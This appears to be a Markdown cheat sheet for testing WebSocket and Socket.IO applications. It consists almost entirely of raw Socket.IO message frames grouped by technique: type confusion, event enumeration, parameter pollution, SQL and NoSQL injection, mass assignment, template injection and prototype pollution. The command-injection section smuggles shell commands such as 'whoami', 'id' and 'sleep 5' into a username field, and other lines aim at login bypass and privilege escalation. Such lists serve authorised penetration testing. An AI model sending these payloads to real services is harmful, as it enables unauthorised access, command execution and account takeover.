## WebSocket / Socket.IO Security Assessment



### All Tricks For Test WebSocket :

##### Type Confusion / Type Juggling

```
42["message",{"username":["admin"]}]
42["message",{"username":null}]
42["message",{"username":0}]
42["message",{"username":124}]
42["message",{"username":true}]
42["message",{"username":false}]
42["message",{"username":[]}]
42["message",{"username":{}}]
42["message",{"username":[1,2,3]}]
42["message",{"username":{"a":"b"}}]
42["message",{"username":["guest","admin"]}]
42["message",{"username":["admin","guest"]}]
```

##### Event Discovery (Event Enumeration)

```
42["login",{"username":"admin"}]
42["search",{"username":"admin"}]
42["auth",{"username":"admin"}]
42["admin",{"username":"admin"}]
42["getUser",{"username":"admin"}]
42["user",{"username":"admin"}]
42["check",{"username":"admin"}]
42["checkUser",{"username":"admin"}]
42["find",{"username":"admin"}]
42["query",{"username":"admin"}]
42["greeting",{"username":"admin"}]
42["greet",{"username":"admin"}]
42["hello",{"username":"admin"}]
42["info",{"username":"admin"}]
42["profile",{"username":"admin"}]
42["whoami",{"username":"admin"}]
```

##### JSON Parameter Pollution

```
42["message",{"username":"guest","username":"admin"}]
42["message",{"username":"admin","username":"guest"}]
42["message",{"username":"admin","username":["admin","guest"]}]
42["message",{"username":"admin","Username":"guest"}]
42["message",{"username":"admin","USERNAME":"guest"}]
42["message",{"username":" admin","username":"admin "}]
```

##### SQL Injection

```
42["message",{"username":"admin' --"}]
42["message",{"username":"admin' OR '1'='1"}]
42["message",{"username":"' OR 1=1--"}]
```

##### Command Injection

```
42["message",{"username":"admin; whoami"}]
42["message",{"username":"admin && whoami"}]
42["message",{"username":"admin | whoami"}]
42["message",{"username":"admin || whoami"}]
42["message",{"username":"admin` whoami `"}]
42["message",{"username":"admin$(whoami)"}]
42["message",{"username":"admin; id"}]
42["message",{"username":"admin; sleep 5"}]
42["message",{"username":"admin%0awhoami"}]
42["message",{"username":"admin\nwhoami"}]
42["message",{"username":"admin${IFS}whoami"}]
```

##### NoSQL Injection (Operator Injection)

```
42["message",{"username":{"$ne":null}}]
42["message",{"username":{"$ne":""}}]
42["message",{"username":{"$gt":""}}]
42["message",{"username":{"$regex":"^a"}}]
```

##### Mass Assignment / Parameter Pollution

```
42["message",{"username":"admin","isAdmin":true}]
42["message",{"username":"guest","role":"admin"}]
42["message",{"username":{"name":"admin","isAdmin":true}}]
42["message",{"username":"test","role":"admin"}]
42["message",{"username":"test","isAdmin":true}]
42["message",{"username":"user","username":"admin"}]
```

##### Unicode / Whitespace Bypass

```
42["message",{"username":"admin "}]
42["message",{"username":"Admin"}]
42["message",{"username":"admin\n"}]
42["message",{"username":"admin\u200B"}]
42["message",{"username":"admin\u00A0"}]
```

##### Server-Side Template Injection (SSTI)

```
42["message",{"username":"{{7*7}}"}]
42["message",{"username":"${7*7}"}]
42["message",{"username":"<%= 7*7 %>"}]
42["message",{"username":"#{7*7}"}]
42["message",{"username":"{{= 7*7 }}"}]
```

##### Server-Side Prototype Pollution

```
42["message",{"__proto__":{"initialPacket":"Polluted"}}]
```
